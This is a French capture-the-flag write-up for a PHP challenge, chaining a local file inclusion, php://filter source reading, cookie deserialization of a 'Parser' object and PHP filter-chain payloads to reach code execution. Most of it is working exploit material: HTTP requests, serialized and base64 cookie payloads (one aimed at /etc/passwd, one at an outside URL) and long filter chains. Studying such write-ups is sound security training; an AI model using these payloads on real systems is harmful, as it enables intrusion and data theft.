Local Terror
===============

On se rend sur /api/ 

On a ensuite un formulaire qui retourne le message qu'on lui envoie + le contenu d'un fichier qui change selon la version.

On a une local file inclusion dans le paramètre version

Si on ajoute ".." dans version, alors on obtient "HACKER DETECTED"

Si on ajoute "%00" on obtienr une erreur qui nous indique que la fonction utilisé est "file_get_content"

.. code-block:: console


    POST /api/ HTTP/1.1
    Host: 57.128.112.118:14539
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Referer: http://57.128.112.118:14539/api/
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 90
    Origin: http://57.128.112.118:14539
    Connection: keep-alive
    Upgrade-Insecure-Requests: 1
    X-PwnFox-Color: red
    Priority: u=0, i

    userName=mon+nom&inputText=texte&language=php&language=text&version=index.php&rendering=on


On obtient le code index.php : 

.. code-block:: php

        <?php
        // Work done based on previous version: old/index-old-do-not-use-please.php. The last code was vulnerable and so must bot be used in any circumstances.
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
            $userName = htmlspecialchars($_POST['userName']);
            $language = $_POST['language'];
            $version = $_POST['version'];
            $rendering = $_POST['rendering'];
            $inputText = ($rendering === 'on' && $language === 'html') ? $_POST['inputText'] : htmlspecialchars($_POST['inputText']);
            
            if ($language === "php") {
                echo "<div class='output'>";
                echo "<h2>Erreur :</h2>";
                echo "<p>Vous avez sélectionné l'option 'PHP'. Cette option est désactivée pour des raisons de sécurité.</p>";
                echo "</div>";
                exit;
            }

            if (stripos($version, 'base64') !== false) {
                echo 'HACKER DETECTÉ';
                exit;    
            }

            if (strpos($version, '..') === false){
                $fileContent = @file_get_contents("$version");
            } else {
                $fileContent = 'HACKER DETECTÉ';
            }

            echo "<div class='output'>";
            echo "<h2>Soumis par : $userName</h2>";
            echo "<h3>Votre Texte :</h3>";
            echo "<p> $inputText </p>";
            echo "<h3>Contenu du fichier :</h3>";
            echo "<p> $fileContent </p>";
            echo "</div>";
            }
            ?>
        </div>
    </body>
    </html>


Avec ceci, on obtient le fichier index.php mais encodé en rot13 : 

.. code-block:: console

    userName=mon+nom&inputText=texte&language=php&language=text&version=php://filter/read=string.rot13/resource=index.php&rendering=on

On peut donc utiliser les wrapper php

On va déjà récupérer le fichier : old/index-old-do-not-use-please.php 

.. code-block:: php

    <?php
    // Do not use this file anymore.
    // First of all it is not working well. You need to reload the page to see the output.
    // And it is vulnerable to attacks. It is not safe to use this file.
    // Please delete and tell the prod tean to not push this file to the server.
    // Thx, A.L

    class Parser {
        public $text;
        public $debug;
        public $version;
        public $betterprint;

        function __construct($text, $version, $debug = false, $betterprint = false) {
            $this->debug = $debug;
            $this->text = $text;
            $this->version = $version;
            $this->betterprint = $betterprint;
        }

        function evaluate(){
            if ($this->debug && $this->version === 'v1.0') {
                require_once($this);
            }
            echo $this;
        }

        function __toString() {
            if ($this->betterprint) {
                return $this->text;
            }
            return $this->version;
        }
        
    }

    if ($_SERVER["REQUEST_METHOD"] == "POST") {

        setcookie("parser", base64_encode(serialize(new Parser($_POST['inputText'],$_POST['version']))), time() + (86400 * 30), "/");


    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Text Input and Output</title>
        <style>
            .container {
                margin: 50px auto;
                width: 70%;
                text-align: center;
            }
            select, textarea, input[type="text"], .output {
                width: 100%;
                padding: 10px;
                margin-top: 10px;
            }
            .select-container {
                display: flex;
                justify-content: space-between;
            }
            .select-container select {
                flex: 1;
                margin: 0 5px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>Enter Your Text</h2>
            <form method="post">
                <textarea name="inputText" rows="10" id="input"></textarea>
                <br>
                <div class="select-container">
                    <select name="version" id="version">
                        <option value="v0.5">v0.5</option>
                        <option value="v0.1">v0.1</option>
                    </select>
                </div>
                <br>
                <button type="submit" onclick="submitFormData()">Submit</button>
            </form>

            <?php

            if(isset($_COOKIE["parser"]) && !empty($_COOKIE["parser"])){
                echo "<div class='output'>";
                echo "<h3>Your Text:</h3>";
                echo "<p> ";
                echo unserialize(base64_decode($_COOKIE['parser']))->evaluate();
                echo " </p>";
                echo "</div>";
            }
            ?>
        </div>
    </body>
    </html>
    </p></div>


On va donc modifier notre cookie pour qu'il soit unserialize et exploiter cette fonctionnalité. 

.. code-block:: console

    O:6:"Parser":4:{s:4:"text";s:11:"/etc/passwd";s:5:"debug";b:1;s:7:"version";s:4:"v1.0";s:11:"betterprint";b:1;}
    Tzo2OiJQYXJzZXIiOjQ6e3M6NDoidGV4dCI7czoxMToiL2V0Yy9wYXNzd2QiO3M6NToiZGVidWciO2I6MTtzOjc6InZlcnNpb24iO3M6NDoidjEuMCI7czoxMToiYmV0dGVycHJpbnQiO2I6MTt9
    require_once(): open_basedir restriction in effect. File(/etc/passwd) is not within the allowed path(s): (/var/www/html) in <b>/var/www/html/api/old/index-old-do-not-use-please.php

    O:6:"Parser":4:{s:4:"text";s:34:"https://ahvce.free.beeceptor.com/a";s:5:"debug";b:1;s:7:"version";s:4:"v1.0";s:11:"betterprint";b:1;}
    Tzo2OiJQYXJzZXIiOjQ6e3M6NDoidGV4dCI7czozNDoiaHR0cHM6Ly9haHZjZS5mcmVlLmJlZWNlcHRvci5jb20vYSI7czo1OiJkZWJ1ZyI7YjoxO3M6NzoidmVyc2lvbiI7czo0OiJ2MS4wIjtzOjExOiJiZXR0ZXJwcmludCI7YjoxO30%3D
    Warning</b>:  require_once(): https:// wrapper is disabled in the server configuration by allow_url_fopen=0 in <b>/var/www/html/api/old/index-old-do-not-use-please.php</b> on line <b>24


On ne peut donc pas sortir de /var/www/html, et on ne peut pas inclure de fichier distant. 

Finalement on va utiliser ceci : https://github.com/synacktiv/php_filter_chain_generator

.. code-block:: console

    python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>'
    [+] The following gadget chain will generate the following code : <?php phpinfo(); ?> (base64 value: PD9waHAgcGhwaW5mbygpOyA/Pg)
    php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp

    O:6:"Parser":4:{s:4:"text";s:4130:"php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp";s:5:"debug";b:1;s:7:"version";s:4:"v1.0";s:11:"betterprint";b:1;}
    Tzo2OiJQYXJzZXIiOjQ6e3M6NDoidGV4dCI7czo0MTMwOiJwaHA6Ly9maWx0ZXIvY29udmVydC5pY29udi5VVEY4LkNTSVNPMjAyMktSfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LlNFMi5VVEYtMTZ8Y29udmVydC5pY29udi5DU0lCTTkyMS5OQVBMUFN8Y29udmVydC5pY29udi44NTUuQ1A5MzZ8Y29udmVydC5pY29udi5JQk0tOTMyLlVURi04fGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5TRTIuVVRGLTE2fGNvbnZlcnQuaWNvbnYuQ1NJQk0xMTYxLklCTS05MzJ8Y29udmVydC5pY29udi5NUzkzMi5NUzkzNnxjb252ZXJ0Lmljb252LkJJRzUuSk9IQUJ8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LklCTTg2OS5VVEYxNnxjb252ZXJ0Lmljb252LkwzLkNTSVNPOTB8Y29udmVydC5pY29udi5VQ1MyLlVURi04fGNvbnZlcnQuaWNvbnYuQ1NJU09MQVRJTjYuVUNTLTR8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252Ljg4NTlfMy5VVEYxNnxjb252ZXJ0Lmljb252Ljg2My5TSElGVF9KSVNYMDIxM3xjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuODUxLlVURi0xNnxjb252ZXJ0Lmljb252LkwxLlQuNjE4QklUfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5DU0FfVDUwMC5VVEYtMzJ8Y29udmVydC5pY29udi5DUDg1Ny5JU08tMjAyMi1KUC0zfGNvbnZlcnQuaWNvbnYuSVNPMjAyMkpQMi5DUDc3NXxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuSUJNODkxLkNTVU5JQ09ERXxjb252ZXJ0Lmljb252LklTTzg4NTktMTQuSVNPNjkzN3xjb252ZXJ0Lmljb252LkJJRy1GSVZFLlVDUy00fGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5TRTIuVVRGLTE2fGNvbnZlcnQuaWNvbnYuQ1NJQk05MjEuTkFQTFBTfGNvbnZlcnQuaWNvbnYuODU1LkNQOTM2fGNvbnZlcnQuaWNvbnYuSUJNLTkzMi5VVEYtOHxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuODUxLlVURi0xNnxjb252ZXJ0Lmljb252LkwxLlQuNjE4QklUfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5KUy5VTklDT0RFfGNvbnZlcnQuaWNvbnYuTDQuVUNTMnxjb252ZXJ0Lmljb252LlVDUy0yLk9TRjAwMDMwMDEwfGNvbnZlcnQuaWNvbnYuQ1NJQk0xMDA4LlVURjMyQkV8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LlNFMi5VVEYtMTZ8Y29udmVydC5pY29udi5DU0lCTTkyMS5OQVBMUFN8Y29udmVydC5pY29udi5DUDExNjMuQ1NBX1Q1MDB8Y29udmVydC5pY29udi5VQ1MtMi5NU0NQOTQ5fGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5VVEY4LlVURjE2TEV8Y29udmVydC5pY29udi5VVEY4LkNTSVNPMjAyMktSfGNvbnZlcnQuaWNvbnYuVVRGMTYuRVVDVFd8Y29udmVydC5pY29udi44ODU5XzMuVUNTMnxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuU0UyLlVURi0xNnxjb252ZXJ0Lmljb252LkNTSUJNMTE2MS5JQk0tOTMyfGNvbnZlcnQuaWNvbnYuTVM5MzIuTVM5MzZ8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LkNQMTA0Ni5VVEYzMnxjb252ZXJ0Lmljb252Lkw2LlVDUy0yfGNvbnZlcnQuaWNvbnYuVVRGLTE2TEUuVC42MS04QklUfGNvbnZlcnQuaWNvbnYuODY1LlVDUy00TEV8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252Lk1BQy5VVEYxNnxjb252ZXJ0Lmljb252Lkw4LlVURjE2QkV8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LkNTR0IyMzEyLlVURi0zMnxjb252ZXJ0Lmljb252LklCTS0xMTYxLklCTTkzMnxjb252ZXJ0Lmljb252LkdCMTMwMDAuVVRGMTZCRXxjb252ZXJ0Lmljb252Ljg2NC5VVEYtMzJMRXxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuTDYuVU5JQ09ERXxjb252ZXJ0Lmljb252LkNQMTI4Mi5JU08tSVItOTB8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252Lkw0LlVURjMyfGNvbnZlcnQuaWNvbnYuQ1AxMjUwLlVDUy0yfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5TRTIuVVRGLTE2fGNvbnZlcnQuaWNvbnYuQ1NJQk05MjEuTkFQTFBTfGNvbnZlcnQuaWNvbnYuODU1LkNQOTM2fGNvbnZlcnQuaWNvbnYuSUJNLTkzMi5VVEYtOHxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuODg1OV8zLlVURjE2fGNvbnZlcnQuaWNvbnYuODYzLlNISUZUX0pJU1gwMjEzfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5DUDEwNDYuVVRGMTZ8Y29udmVydC5pY29udi5JU082OTM3LlNISUZUX0pJU1gwMjEzfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5DUDEwNDYuVVRGMzJ8Y29udmVydC5pY29udi5MNi5VQ1MtMnxjb252ZXJ0Lmljb252LlVURi0xNkxFLlQuNjEtOEJJVHxjb252ZXJ0Lmljb252Ljg2NS5VQ1MtNExFfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5NQUMuVVRGMTZ8Y29udmVydC5pY29udi5MOC5VVEYxNkJFfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5DU0lCTTExNjEuVU5JQ09ERXxjb252ZXJ0Lmljb252LklTTy1JUi0xNTYuSk9IQUJ8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LklOSVMuVVRGMTZ8Y29udmVydC5pY29udi5DU0lCTTExMzMuSUJNOTQzfGNvbnZlcnQuaWNvbnYuSUJNOTMyLlNISUZUX0pJU1gwMjEzfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5TRTIuVVRGLTE2fGNvbnZlcnQuaWNvbnYuQ1NJQk0xMTYxLklCTS05MzJ8Y29udmVydC5pY29udi5NUzkzMi5NUzkzNnxjb252ZXJ0Lmljb252LkJJRzUuSk9IQUJ8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0LmJhc2U2NC1kZWNvZGUvcmVzb3VyY2U9cGhwOi8vdGVtcCI7czo1OiJkZWJ1ZyI7YjoxO3M6NzoidmVyc2lvbiI7czo0OiJ2MS4wIjtzOjExOiJiZXR0ZXJwcmludCI7YjoxO30K

On met ça dans notre cookie, on l'encode en base64 et bim phpinfo ! 

Par contre on a beaucoup de fonctions désactivés ça va pas être évident : 

.. code-block:: console

    apache_note, apache_setenv, chgrp, curl_multi_exec, define_sys, define_syslog_variables, debugger_off, debugger_on, diskfreespace, _getppid, escapeshellarg, escapeshellcmd, exec, getmyuid, ini_restore, leak, listen, parse_ini_file, passthru, pcntl_alarm, pcntl_async_signals, pcntl_exec, pcntl_fork, file_put_contents, pcntl_get_last_error, pcntl_getpriority, pcntl_setpriority, pcntl_signal, pcntl_signal_dispatch, pcntl_signal_get_handler, pcntl_sigprocmask, pcntl_sigtimedwait, pcntl_sigwaitinfo, pcntl_strerror, pcntl_unshare, pcntl_wait, pcntl_waitpid, pcntl_wexitstatus, pcntl_wifcontinued, pcntl_wifexited, pcntl_wifsignaled, pcntl_wifstopped, pcntl_wstopsig, pcntl_wtermsig, posix, posix_ctermid, posix_getcwd, posix_getegid, posix_geteuid, posix_getgid, posix_getgrgid, posix_getgrnam, posix_getgroups, posix_getlogin, posix_getpgid, posix_getpgrp, posix_getpid, posix_getpwnam, posix_getpwuid, posix_getrlimit, posix_getsid, posix_isatty, posix_kill, posix_mkfifo, posix_setegid, posix_seteuid, posix_setgid, posix_setpgid, posix_setsid, posix_setuid, posix_times, posix_ttyname, posix_uname, popen, proc_close, proc_get_status, proc_nice, proc_open, proc_terminate, shell_exec, show_source, system, url_exec, preg_replace, opendir, readdir, scandir, print_r

    python3 php_filter_chain_generator.py --chain '<?php foreach (array_map("basename", glob("/var/www/html/*")) as $file) echo $file . "\n"; ?>'

On récupère la sortie, on l'a met dans l'objet, avec une taille de 18713, on encode le tout en base64 et on envoie le cookie : 

.. code-block:: console 

    Tzo2OiJQYXJzZXIiOjQ6e3M6NDoidGV4dCI7czoxODcxMzoicGhwOi8vZmlsdGVyL2NvbnZlcnQuaWNvbnYuVVRGOC5DU0lTTzIwMjJLUnxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5VVEY4LlVURjE2fGNvbnZlcnQuaWNvbnYuV0lORE9XUy0xMjU4LlVURjMyTEV8Y29udmVydC5pY29udi5JU0lSSTMzNDIuSVNPLUlSLTE1N3xjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuSVNPMjAyMktSLlVURjE2fGNvbnZlcnQuaWNvbnYuTDYuVUNTMnxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuSU5JUy5VVEYxNnxjb252ZXJ0Lmljb252LkNTSUJNMTEzMy5JQk05NDN8Y29udmVydC5pY29udi5JQk05MzIuU0hJRlRfSklTWDAyMTN8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252Lkw1LlVURi0zMnxjb252ZXJ0Lmljb252LklTTzg4NTk0L